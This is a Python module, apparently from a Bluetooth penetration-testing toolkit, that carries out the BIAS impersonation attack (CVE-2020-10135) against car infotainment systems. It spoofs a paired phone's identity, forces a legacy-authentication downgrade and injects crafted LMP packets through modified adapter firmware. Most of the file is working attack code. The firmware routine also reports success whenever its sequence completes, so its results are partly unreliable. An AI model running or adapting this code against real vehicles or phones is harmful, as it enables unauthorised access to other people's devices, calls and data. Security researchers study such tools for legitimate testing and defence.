"""BIAS (Bluetooth Impersonation AttackS) — CVE-2020-10135.

BIAS exploits a flaw in the Bluetooth BR/EDR authentication procedure where
a device can impersonate any previously paired device by manipulating the
role-switch and authentication mechanisms during connection establishment.

Attack principle:
  1. Spoof the target phone's MAC address
  2. Initiate connection to the IVI (or accept its connection)
  3. During LMP authentication, exploit one of:
     a) Role switch: force central→peripheral role change to skip mutual auth
     b) Downgrade: request legacy authentication instead of secure auth
     c) Unilateral auth: only one side authenticates (IVI authenticates us,
        but we don't authenticate back, or vice versa)
  4. IVI accepts connection believing we are the legitimate phone

Affected versions:
  - All Bluetooth BR/EDR devices using Secure Connections or Legacy auth
  - Spec versions: BT 2.1+ through 5.2 (patched in some 5.3+ implementations)
  - Patches: Bluetooth SIG advisory June 2020, vendor-specific firmware updates

Prerequisites:
  - USRP B210 + gr-bluetooth or modified BlueZ stack for LMP manipulation
  - DarkFirmware on RTL8761B for below-HCI LMP injection
  - Target must have an existing pairing (we impersonate one side)

Limitations:
  - Does NOT work if both sides enforce mutual authentication post-patch
  - Requires chipset-level control for LMP manipulation (DarkFirmware on RTL8761B)
  - Detection: unusual role-switch patterns in HCI logs

References:
  - Antonioli et al. "BIAS: Bluetooth Impersonation AttackS" IEEE S&P 2020
  - https://francozappa.github.io/about-bias/
  - CVE-2020-10135
"""

import time
import re

from blue_tap.utils.bt_helpers import run_cmd
from blue_tap.core.spoofer import clone_device_identity
from blue_tap.core.adapter import adapter_reset, disable_ssp, enable_page_scan
from blue_tap.utils.output import (
    info, success, error, warning, verbose,
    phase, step, substep, summary_panel, target,
)
from blue_tap.core.result_schema import (
    EXECUTION_COMPLETED, EXECUTION_FAILED, EXECUTION_ERROR,
    build_run_envelope, make_execution, make_evidence, make_run_id, now_iso,
)
from blue_tap.core.cli_events import emit_cli_event


class BIASAttack:
    """BIAS attack orchestration for IVI impersonation.

    Provides two approaches in order of practicality:
      1. Role-switch downgrade via bluetoothctl (software-only, best effort)
      2. DarkFirmware LMP injection on RTL8761B (below-HCI, full BIAS)
    """

    def __init__(self, ivi_address: str, phone_address: str,
                 phone_name: str = "", hci: str = "hci0"):
        self.ivi_address = ivi_address
        self.phone_address = phone_address
        self.phone_name = phone_name
        self.hci = hci
        self.run_id = make_run_id("bias")
        self._started_at = now_iso()
        self._cli_events: list[dict] = []
        self._executions: list[dict] = []

    def _emit(self, event_type: str, message: str, **details):
        evt = emit_cli_event(
            event_type=event_type, module="attack", run_id=self.run_id,
            target=self.ivi_address, adapter=self.hci, message=message,
            details=details,
        )
        self._cli_events.append(evt)

    def probe_vulnerability(self) -> dict:
        """Probe whether the IVI may be vulnerable to BIAS.

        Checks:
          - SSP support (BIAS targets SSP-paired devices)
          - Bluetooth version (patched in some 5.3+ firmwares)
          - Secure Connections feature (BIAS Variant 2 downgrades SC)
          - Whether the IVI initiates reconnection (BIAS is easier as responder)

        Returns dict with vulnerability assessment.
        """
        phase_start = now_iso()
        self._emit("phase_started", "BIAS vulnerability probe starting")
        from blue_tap.utils.bt_helpers import ensure_adapter_ready
        if not ensure_adapter_ready(self.hci):
            self._executions.append(make_execution(
                kind="check", id="bias_probe", title="BIAS Vulnerability Probe (CVE-2020-10135)",
                module="attack", protocol="BR/EDR",
                execution_status=EXECUTION_ERROR, module_outcome="failed",
                evidence=make_evidence(summary="Adapter not ready", confidence="high"),
                started_at=phase_start, completed_at=now_iso(),
                tags=["cve", "CVE-2020-10135", "bias"],
            ))
            self._emit("execution_error", "BIAS probe failed: adapter not ready")
            return {"potentially_vulnerable": False, "error": "adapter not ready"}

        result = {
            "potentially_vulnerable": False,
            "ssp_detected": None,
            "sc_detected": None,
            "bt_version": None,
            "auto_reconnects": False,
            "notes": [],
        }

        with phase("BIAS Vulnerability Probe"):
            # Check SSP
            with step("Checking SSP support"):
                from blue_tap.recon.sdp import check_ssp
                ssp = check_ssp(self.ivi_address)
                result["ssp_detected"] = ssp
                if ssp is True:
                    info("SSP supported — BIAS targets SSP-paired devices")
                    result["potentially_vulnerable"] = True
                elif ssp is False:
                    info("SSP not detected — BIAS may still apply to legacy pairing")
                    result["potentially_vulnerable"] = True
                    result["notes"].append("Legacy pairing: BIAS not needed, PIN brute-force may suffice")
                else:
                    warning("SSP status unknown")

            # Check BT version
            with step("Checking Bluetooth version"):
                info_result = run_cmd(
                    ["hcitool", "-i", self.hci, "info", self.ivi_address],
                    timeout=10,
                )
                if info_result.returncode == 0:
                    m = re.search(r"LMP Version:\s*(.+)", info_result.stdout)
                    if m:
                        ver_str = m.group(1).strip()
                        result["bt_version"] = ver_str
                        info(f"Bluetooth version: {ver_str}")

                        # Parse numeric version
                        ver_m = re.search(r"(\d+\.\d+)", ver_str)
                        if ver_m:
                            ver = float(ver_m.group(1))
                            if ver >= 5.3:
                                warning("BT 5.3+ — may have BIAS mitigations")
                                result["notes"].append("BT 5.3+: check vendor patch status")
                            else:
                                info(f"BT {ver} — in BIAS-affected range")

            # Check auto-reconnect behavior
            with step("Testing auto-reconnect (passive, 15s)"):
                info("Spoofing phone identity and enabling page scan...")
                clone_device_identity(
                    self.hci, self.phone_address,
                    self.phone_name or "Phone", "0x5a020c",
                )
                try:
                    enable_page_scan(self.hci)

                    end_time = time.time() + 15
                    while time.time() < end_time:
                        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
                        if "Connected: yes" in verify.stdout:
                            result["auto_reconnects"] = True
                            success("IVI auto-reconnected to spoofed identity!")
                            result["notes"].append("Auto-reconnect: IVI initiates connection to spoofed phone")
                            break
                        time.sleep(2)

                    if not result["auto_reconnects"]:
                        info("IVI did not auto-reconnect (normal — we'll initiate instead)")
                finally:
                    # Always reset adapter even if probing crashed
                    adapter_reset(self.hci)

            # Summary
            summary_panel("BIAS Probe Results", {
                "Target IVI": self.ivi_address,
                "Phone to impersonate": self.phone_address,
                "SSP": str(result["ssp_detected"]),
                "BT Version": result["bt_version"] or "Unknown",
                "Auto-Reconnects": str(result["auto_reconnects"]),
                "Potentially Vulnerable": str(result["potentially_vulnerable"]),
            })
            for note in result["notes"]:
                substep(f"Note: {note}")

        self._executions.append(make_execution(
            kind="check", id="bias_probe", title="BIAS Vulnerability Probe (CVE-2020-10135)",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED,
            module_outcome="confirmed" if result["potentially_vulnerable"] else "not_applicable",
            evidence=make_evidence(
                summary=f"SSP={result['ssp_detected']}, BT={result.get('bt_version', '?')}, auto_reconnect={result['auto_reconnects']}",
                confidence="medium",
                observations=result["notes"],
                module_evidence={"ssp": result["ssp_detected"], "bt_version": result.get("bt_version"), "auto_reconnects": result["auto_reconnects"]},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["cve", "CVE-2020-10135", "bias"],
            module_data=result,
        ))
        self._emit("execution_result", f"BIAS probe: {'potentially vulnerable' if result['potentially_vulnerable'] else 'not vulnerable'}")

        return result

    def execute_role_switch(self) -> dict:
        """Attempt BIAS via role-switch downgrade (software-only approach).

        BIAS Variant 1: Spoof phone MAC, disable SSP (force legacy auth),
        connect. If IVI doesn't enforce mutual auth, connection succeeds.

        This is the best-effort software approach:
          1. Spoof phone MAC + identity
          2. Disable SSP on our adapter (force legacy auth negotiation)
          3. Connect to IVI — during auth, BlueZ may negotiate weaker auth
          4. If IVI accepts, we're connected as the phone

        This works when:
          - IVI doesn't enforce mutual authentication on reconnect
          - IVI accepts legacy auth downgrade from a "known" device
          - IVI has BIAS vulnerability unpatched

        This does NOT work when:
          - IVI enforces Secure Connections Only mode
          - IVI validates link key (we don't have it)
          - IVI has BIAS patches applied
        """
        phase_start = now_iso()
        self._emit("phase_started", "BIAS role-switch attack starting")
        results = {
            "method": "role_switch_downgrade",
            "connected": False,
            "auth_method": None,
            "notes": [],
        }

        with phase("BIAS Role-Switch Attack"):
            # Step 1: Clone phone identity
            with step(f"Cloning {target(self.phone_address)} identity"):
                clone_result = clone_device_identity(
                    self.hci, self.phone_address,
                    self.phone_name or "Phone", "0x5a020c",
                )
                if not clone_result.get("success", False):
                    error("Identity clone failed")
                    results["notes"].append("Failed to spoof MAC/name")
                    self._executions.append(make_execution(
                        kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
                        module="attack", protocol="BR/EDR",
                        execution_status=EXECUTION_FAILED, module_outcome="failed",
                        evidence=make_evidence(summary="Identity clone failed", confidence="high", observations=results["notes"]),
                        started_at=phase_start, completed_at=now_iso(),
                        tags=["cve", "CVE-2020-10135", "bias", "role-switch"], module_data=results,
                    ))
                    self._emit("execution_error", "BIAS role-switch failed: identity clone failed")
                    return results
                success("Identity cloned")
                time.sleep(2)

            # Step 2: Disable SSP to attempt legacy auth downgrade
            with step("Disabling SSP (force legacy auth negotiation)"):
                disable_ssp(self.hci)
                results["notes"].append("SSP disabled on local adapter")
                info("Local adapter will request legacy authentication")
                info("If IVI accepts downgrade, mutual auth may be skipped")

            # Step 3: Enable page scan (be visible as the phone)
            with step("Enabling page scan (visible as phone)"):
                enable_page_scan(self.hci)
                time.sleep(1)

            # Step 4: Attempt connection
            with step(f"Connecting to IVI {target(self.ivi_address)}"):
                import subprocess
                bt_commands = "\n".join([
                    f"select {self.hci}",
                    f"trust {self.ivi_address}",
                    f"pair {self.ivi_address}",
                    f"connect {self.ivi_address}",
                    "quit",
                ])
                try:
                    proc_result = subprocess.run(
                        ["bluetoothctl"],
                        input=bt_commands,
                        capture_output=True,
                        text=True,
                        timeout=30,
                        errors="replace",
                    )
                except subprocess.TimeoutExpired:
                    error("bluetoothctl timed out after 30s — BIAS connection may be incomplete")
                    run_cmd(["bluetoothctl", "cancel-pairing", self.ivi_address], timeout=5)
                    results["notes"].append("bluetoothctl timed out")
                    self._executions.append(make_execution(
                        kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
                        module="attack", protocol="BR/EDR",
                        execution_status=EXECUTION_FAILED, module_outcome="failed",
                        evidence=make_evidence(summary="bluetoothctl timed out", confidence="high", observations=results["notes"]),
                        started_at=phase_start, completed_at=now_iso(),
                        tags=["cve", "CVE-2020-10135", "bias", "role-switch"], module_data=results,
                    ))
                    self._emit("execution_error", "BIAS role-switch failed: bluetoothctl timeout")
                    return results
                output = proc_result.stdout + proc_result.stderr
                verbose(f"bluetoothctl output:\n{output.strip()}")

                # Parse auth events
                if "AuthenticationFailed" in output:
                    results["auth_method"] = "rejected"
                    results["notes"].append("IVI rejected auth — link key validation enforced")
                elif "AlreadyConnected" in output or "Connected: yes" in output:
                    results["auth_method"] = "accepted_existing"
                    results["notes"].append("IVI accepted connection from existing pairing state")

                time.sleep(3)

            # Step 5: Verify connection
            with step("Verifying connection"):
                verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
                if "Connected: yes" in verify.stdout:
                    results["connected"] = True
                    success("BIAS attack SUCCEEDED — connected to IVI as phone")

                    # Check which auth was used
                    if "Paired: yes" in verify.stdout:
                        results["notes"].append("Device shows as paired")
                    if "Trusted: yes" in verify.stdout:
                        results["notes"].append("Device shows as trusted")
                else:
                    warning("Connection not established")
                    results["notes"].append("IVI may have BIAS mitigations or requires link key")

            # Summary
            status = "SUCCEEDED" if results["connected"] else "FAILED"
            summary_panel(f"BIAS Attack {status}", {
                "Method": "Role-switch / legacy auth downgrade",
                "Connected": str(results["connected"]),
                "Auth Result": results["auth_method"] or "Unknown",
            })
            for note in results["notes"]:
                substep(note)

        self._executions.append(make_execution(
            kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED,
            module_outcome="success" if results["connected"] else "failed",
            destructive=False,
            requires_pairing=False,
            evidence=make_evidence(
                summary=f"Role-switch downgrade: connected={results['connected']}, auth={results['auth_method']}",
                confidence="medium",
                observations=results["notes"],
                module_evidence={"connected": results["connected"], "auth_method": results["auth_method"]},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["cve", "CVE-2020-10135", "bias", "role-switch"],
            module_data=results,
        ))
        self._emit("execution_result", f"BIAS role-switch: {'connected' if results['connected'] else 'not connected'}")

        return results

    def execute_darkfirmware(self, variant: str = "auto") -> dict:
        """Execute BIAS attack via DarkFirmware LMP injection on RTL8761B.

        Uses vendor-specific HCI commands to inject LMP packets below the HCI
        layer, manipulating the authentication handshake at the link manager level.

        Supports three variants:
          1. Role Switch: Send LMP_SWITCH_REQ during authentication
          2. Legacy Downgrade: Send LMP_NOT_ACCEPTED to SC PDUs
          3. Unilateral Auth: Send LMP_SRES with zeros

        Steps:
            1. Clone phone identity (MAC + name + class)
            2. Establish ACL connection to IVI
            3. Open HCI VSC socket on DarkFirmware adapter
            4. Start LMP monitor and wait for AU_RAND challenge
            5. Attempt selected exploitation variant

        Args:
            variant: "auto" (tries role_switch first), "role_switch",
                     "legacy_downgrade", or "unilateral_auth".
        """
        phase_start = now_iso()
        self._emit("phase_started", "BIAS DarkFirmware LMP attack starting")
        result = {
            "method": "darkfirmware",
            "variant": variant,
            "success": False,
            "au_rand_received": False,
            "details": [],
        }

        try:
            from blue_tap.core.hci_vsc import HCIVSCSocket
            from blue_tap.core.firmware import DarkFirmwareManager
            from blue_tap.fuzz.protocols.lmp import (
                build_features_req, build_accepted, build_not_accepted,
                build_setup_complete, build_switch_req, build_sres,
                LMP_ACCEPTED, LMP_NOT_ACCEPTED, LMP_AU_RAND,
                LMP_FEATURES_REQ, LMP_ENCRYPTION_MODE_REQ,
                ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE,
            )

            # Verify DarkFirmware is available
            fw = DarkFirmwareManager()
            hci_idx = int(self.hci.replace("hci", "")) if self.hci.startswith("hci") else 1
            if not fw.is_darkfirmware_loaded(self.hci):
                result["details"].append("DarkFirmware not loaded on adapter")
                self._executions.append(make_execution(
                    kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
                    module="attack", protocol="BR/EDR",
                    execution_status=EXECUTION_FAILED, module_outcome="not_applicable",
                    evidence=make_evidence(summary="DarkFirmware not loaded on adapter", confidence="high", observations=result["details"]),
                    started_at=phase_start, completed_at=now_iso(),
                    tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"], module_data=result,
                ))
                self._emit("execution_error", "BIAS DarkFirmware: not loaded on adapter")
                return result

            info("[BIAS] Step 1: DarkFirmware confirmed on adapter")
            result["details"].append("DarkFirmware confirmed on adapter")

            # Phase 1: Clone phone identity
            info(f"[BIAS] Step 2: Cloning identity {self.phone_address}")
            clone_result = clone_device_identity(self.hci, self.phone_address,
                                                   self.phone_name, "0x5a020c")
            if not clone_result.get("success", False):
                error("[BIAS] Identity cloning failed")
                result["details"].append("Identity cloning failed")
                self._executions.append(make_execution(
                    kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
                    module="attack", protocol="BR/EDR",
                    execution_status=EXECUTION_FAILED, module_outcome="failed",
                    evidence=make_evidence(summary="Identity cloning failed", confidence="high", observations=result["details"]),
                    started_at=phase_start, completed_at=now_iso(),
                    tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"], module_data=result,
                ))
                self._emit("execution_error", "BIAS DarkFirmware: identity clone failed")
                return result
            result["details"].append(f"Cloned identity: {self.phone_address}")

            # Phase 2: Connect to IVI
            info(f"[BIAS] Step 3: Connecting to IVI {self.ivi_address}")
            run_cmd(["bluetoothctl", "connect", self.ivi_address], timeout=15)
            time.sleep(2)

            # Phase 3: Open HCI VSC and monitor LMP
            info(f"[BIAS] Step 4: Opening DarkFirmware socket on hci{hci_idx}")
            with HCIVSCSocket(hci_idx) as vsc:
                lmp_events: list[dict] = []
                vsc.start_lmp_monitor(lambda evt: lmp_events.append(evt))

                # Send features request to probe the connection
                info("[BIAS] Step 5: Sending LMP_FEATURES_REQ to probe connection")
                vsc.send_lmp(build_features_req())
                result["details"].append("Sent LMP_FEATURES_REQ via DarkFirmware")

                # Wait for LMP_AU_RAND (authentication challenge)
                info("[BIAS] Step 6: Waiting for LMP_AU_RAND from target (5s)...")
                au_rand_seen = False
                for _wait in range(10):  # 10 x 0.5s = 5s
                    for evt in list(lmp_events):
                        payload = evt.get("payload", b"")
                        if payload and len(payload) >= 1:
                            pdu_opcode = payload[0] & 0x7F
                            if pdu_opcode == LMP_AU_RAND:
                                au_rand_seen = True
                                info("[BIAS] Received AU_RAND challenge from target")
                                result["au_rand_received"] = True
                                result["details"].append("Received LMP_AU_RAND from target")
                                break
                    if au_rand_seen:
                        break
                    time.sleep(0.5)

                if not au_rand_seen:
                    info("[BIAS] No AU_RAND received — proceeding with attack variants anyway")
                    result["details"].append("No AU_RAND received within timeout")

                # Select and execute variant
                variants_to_try = (
                    ["role_switch", "legacy_downgrade", "unilateral_auth"]
                    if variant == "auto"
                    else [variant]
                )

                for v in variants_to_try:
                    info(f"[BIAS] Attempting variant: {v}")
                    result["variant"] = v

                    if v == "role_switch":
                        # Variant 1: Role Switch during auth
                        info("[BIAS] Sending LMP_SWITCH_REQ during authentication...")
                        ok = vsc.send_lmp(build_switch_req(switch_instant=0))
                        if ok:
                            result["details"].append("Sent LMP_SWITCH_REQ during auth (role switch variant)")
                            info("[BIAS] Received AU_RAND challenge, attempting role switch...")
                        else:
                            warning("[BIAS] Failed to send LMP_SWITCH_REQ")
                            result["details"].append("Failed to send role switch request")

                    elif v == "legacy_downgrade":
                        # Variant 2: Legacy Downgrade — reject SC PDUs
                        info("[BIAS] Sending LMP_NOT_ACCEPTED to SC PDUs (legacy downgrade)...")
                        not_accepted = build_not_accepted(
                            rejected_opcode=LMP_ENCRYPTION_MODE_REQ,
                            error_code=ERROR_ENCRYPTION_MODE_NOT_ACCEPTABLE,
                        )
                        ok = vsc.send_lmp(not_accepted)
                        if ok:
                            result["details"].append("Sent LMP_NOT_ACCEPTED to SC PDUs (legacy downgrade)")
                            info("[BIAS] Sent SC rejection — forcing legacy auth")
                        else:
                            warning("[BIAS] Failed to send LMP_NOT_ACCEPTED")
                            result["details"].append("Failed to send legacy downgrade")

                    elif v == "unilateral_auth":
                        # Variant 3: Unilateral Auth — send SRES with zeros
                        info("[BIAS] Sending LMP_SRES with zeros (unilateral auth)...")
                        ok = vsc.send_lmp(build_sres(response=b"\x00\x00\x00\x00"))
                        if ok:
                            result["details"].append("Sent LMP_SRES with zeros (unilateral auth)")
                            info("[BIAS] Sent zero SRES — bypassing mutual authentication")
                        else:
                            warning("[BIAS] Failed to send LMP_SRES")
                            result["details"].append("Failed to send zero SRES")
                    else:
                        warning(f"[BIAS] Unknown variant: {v}")
                        continue

                    time.sleep(2)

                    # If auto mode, check if this variant got a useful response
                    if variant == "auto" and lmp_events:
                        info(f"[BIAS] Variant {v} produced {len(lmp_events)} LMP events")
                        break

                time.sleep(1)
                vsc.stop_lmp_monitor()

                # Analyze LMP responses
                for evt in lmp_events:
                    opcode = evt.get("opcode")
                    result["details"].append(
                        f"LMP event: opcode=0x{opcode:04x}" if opcode else f"LMP event: {evt}"
                    )

                if lmp_events:
                    result["lmp_events"] = len(lmp_events)
                    result["details"].append(f"Captured {len(lmp_events)} LMP events")

            result["success"] = True  # Attack sequence completed (exploitation depends on target response)
            success(f"[BIAS] Attack complete: variant={result['variant']}, "
                    f"{result.get('lmp_events', 0)} LMP events captured")

        except ImportError as exc:
            error(f"[BIAS] Missing dependency: {exc}")
            result["details"].append(f"Missing dependency: {exc}")
        except Exception as exc:
            error(f"[BIAS] DarkFirmware attack error: {exc}")
            result["details"].append(f"DarkFirmware attack error: {exc}")

        self._executions.append(make_execution(
            kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
            module="attack", protocol="BR/EDR",
            execution_status=EXECUTION_COMPLETED if result["success"] else EXECUTION_FAILED,
            module_outcome="success" if result["success"] else "failed",
            evidence=make_evidence(
                summary=f"DarkFirmware variant={result['variant']}, success={result['success']}, au_rand={result['au_rand_received']}",
                confidence="medium",
                observations=result["details"],
                module_evidence={"variant": result["variant"], "au_rand_received": result["au_rand_received"], "lmp_events": result.get("lmp_events", 0)},
            ),
            started_at=phase_start, completed_at=now_iso(),
            tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"],
            module_data=result,
        ))
        self._emit("execution_result", f"BIAS DarkFirmware: {'succeeded' if result['success'] else 'failed'} (variant={result['variant']})")

        return result

    def build_envelope(self) -> dict:
        """Build a RunEnvelope v2 dict summarising all executions so far."""
        return build_run_envelope(
            schema="blue_tap.attack.result",
            module="attack",
            target=self.ivi_address,
            adapter=self.hci,
            operator_context={
                "command": "bias",
                "cve": "CVE-2020-10135",
                "ivi_address": self.ivi_address,
                "phone_address": self.phone_address,
            },
            summary={
                "operation": "bias",
                "cve": "CVE-2020-10135",
                "connected": any(e.get("module_outcome") == "success" for e in self._executions),
            },
            executions=self._executions,
            module_data={"cli_events": self._cli_events},
            started_at=self._started_at,
            run_id=self.run_id,
        )

    def execute(self, method: str = "auto") -> dict:
        """Run BIAS attack with the best available method.

        Methods:
          auto: Try role-switch first, then DarkFirmware LMP injection
          role_switch: Software-only role-switch downgrade
          darkfirmware: Full BIAS via DarkFirmware LMP injection on RTL8761B
          probe: Only probe vulnerability, don't attack

        Returns dict with attack results and attached envelope.
        """
        self._emit("run_started", f"BIAS attack started (method={method})", method=method)

        if method == "probe":
            results = self.probe_vulnerability()
            results["envelope"] = self.build_envelope()
            self._emit("run_completed", "BIAS run completed (probe only)")
            return results

        if method in ("auto", "role_switch"):
            results = self.execute_role_switch()
            if results["connected"]:
                results["envelope"] = self.build_envelope()
                self._emit("run_completed", "BIAS run completed (role-switch succeeded)")
                return results

            if method == "auto":
                info("Role-switch approach did not succeed")
                info("Checking DarkFirmware for full LMP-level BIAS...")
                df_results = self.execute_darkfirmware()
                # Merge notes
                df_results.setdefault("notes", [])
                df_results["notes"] = results["notes"] + df_results["notes"]
                df_results["envelope"] = self.build_envelope()
                self._emit("run_completed", "BIAS run completed (auto: darkfirmware attempted)")
                return df_results

            results["envelope"] = self.build_envelope()
            self._emit("run_completed", "BIAS run completed (role-switch only)")
            return results

        if method == "darkfirmware":
            results = self.execute_darkfirmware()
            results["envelope"] = self.build_envelope()
            self._emit("run_completed", "BIAS run completed (darkfirmware)")
            return results

        error(f"Unknown BIAS method: {method}")
        self._emit("run_completed", f"BIAS run aborted: unknown method {method}")
        return {"connected": False, "error": f"Unknown method: {method}"}
